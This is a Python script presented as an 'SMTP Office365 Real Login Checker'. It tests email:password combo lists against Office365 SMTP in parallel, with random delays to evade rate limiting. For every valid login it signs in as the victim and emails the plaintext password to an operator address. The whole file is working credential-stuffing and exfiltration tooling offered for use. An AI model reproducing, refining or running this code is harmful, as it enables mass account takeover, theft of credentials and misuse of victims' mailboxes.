#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
SMTP Office365 Real Login Checker
Sends VALID HITS directly to admin email using the valid credentials"""

import smtplib
import ssl
import time
import random
import threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ============================================================
#  CONFIG - CHANGE THESE TO YOUR DETAILS
# ============================================================
ADMIN_NOTIFICATION_EMAIL = "admin@example.com"  # <-- ضع إيميلك هنا لاستقبال النتائج

SMTP_SERVER = "smtp.office365.com"
SMTP_PORT = 587

# ============================================================
#  CORE CHECKER
# ============================================================
def check_smtp_office365(email: str, password: str, timeout: int = 15) -> tuple:
    """
    Try real login on smtp.office365.com
    Returns: (is_valid: bool, message: str)
    """
    try:
        context = ssl.create_default_context()
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=timeout)
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(email, password)
        server.quit()
        return True, "Login OK"
    except smtplib.SMTPAuthenticationError:
        return False, "Authentication failed"
    except smtplib.SMTPConnectError:
        return False, "Connection error"
    except Exception as e:
        return False, str(e)

# ============================================================
#  EMAIL NOTIFICATION (USES THE VALID ACCOUNT ITSELF)
# ============================================================
def notify_valid_hit(email: str, password: str, admin_email: str = None):
    """
    Uses the VALID Office365 credentials to send an email notification
    directly to the admin address with the password included.
    """
    target = admin_email or ADMIN_NOTIFICATION_EMAIL
    if not target or target.lower() == email.lower():
        return False
    try:
        context = ssl.create_default_context()
        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT, timeout=15)
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(email, password)

        msg = MIMEMultipart()
        msg["From"] = email
        msg["To"] = target
        msg["Subject"] = f"🎯 VALID HIT | {email}"

        body = f"""✅ VALID OFFICE365 SMTP ACCOUNT FOUND

📧 Email:    {email}
🔐 Password: {password}
🌐 Server:   {SMTP_SERVER}:{SMTP_PORT}
⏰ Time:     {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

-------------------------------------------
NobodyxSoudz2 Professional Checker Suite
-------------------------------------------"""
        msg.attach(MIMEText(body, "plain", "utf-8"))
        server.send_message(msg)
        server.quit()
        print(f"[SMTP NOTIFY] Sent valid hit for {email} to {target}")
        return True
    except Exception as e:
        print(f"[SMTP NOTIFY ERROR] {e}")
        return False

# ============================================================
#  PARALLEL PROCESSOR
# ============================================================
def process_smtp_office365_check_parallel(combos, progress_callback=None, max_workers: int = 15, admin_email: str = None):
    """
    Process combos in parallel. For each valid hit:
    - Add to results list
    - Send immediate email notification with the password
    """
    valids = []
    invalid = 0
    errors = 0
    done = 0
    total = len(combos)
    lock = threading.Lock()

    def worker(combo: str):
        nonlocal done, invalid, errors
        combo = combo.strip()
        if ":" not in combo or "@" not in combo.split(":", 1)[0]:
            with lock:
                done += 1
                errors += 1
            if progress_callback:
                progress_callback(done, total, len(valids), invalid, errors)
            return

        email, password = combo.split(":", 1)
        email = email.strip()
        password = password.strip()

        try:
            is_valid, msg = check_smtp_office365(email, password)
            if is_valid:
                with lock:
                    valids.append(combo)
                # IMMEDIATE EMAIL NOTIFICATION using valid account
                notify_valid_hit(email, password, admin_email)
            else:
                with lock:
                    invalid += 1
        except Exception:
            with lock:
                errors += 1

        with lock:
            done += 1
        if progress_callback:
            progress_callback(done, total, len(valids), invalid, errors)

        # Random delay to avoid rate-limiting
        time.sleep(random.uniform(0.8, 2.0))

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(worker, c) for c in combos]
        for _ in as_completed(futures):
            pass

    if progress_callback:
        progress_callback(total, total, len(valids), invalid, errors)
    return valids, invalid, errors